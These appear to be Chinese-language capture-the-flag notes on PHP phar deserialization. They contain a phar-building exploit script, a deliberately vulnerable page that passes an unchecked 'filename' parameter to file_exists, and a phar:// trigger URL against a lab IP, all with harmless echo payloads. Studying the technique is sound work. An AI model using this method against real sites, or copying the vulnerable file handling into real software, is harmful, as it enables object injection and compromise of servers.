# phar

会自动触发 setMetadata 内的值

## CreatePhar
```php
<?php
class TestObject{
}

$o = new TestObject();
$o -> data = 'h4ck3r';

$phar = new Phar("app.phar");
$phar -> startBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> setMetadata($o);
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
```
## Open phar
```php
<?php
class getflag{
    public $a;
    function __destruct() {
        echo 123;
    }
}

# file_get_contents('phar://app.phar');
file_get_contents('phar://app.phar/test.txt');
```

# Phar题目

1.php

```php
<?php
class TestObject{
    function __destruct(){
        echo $this->data;
    }
}
$filename = $_GET['filename'];
file_exists($filename);
?>
```

exp.php
```php
<?php

class TestObject
{
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new TestObject();
$o->data = 'th1e';
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

生成phar后访问
http://192.168.127.130/a1.php?filename=phar://./phar.phar.gif/test.txt
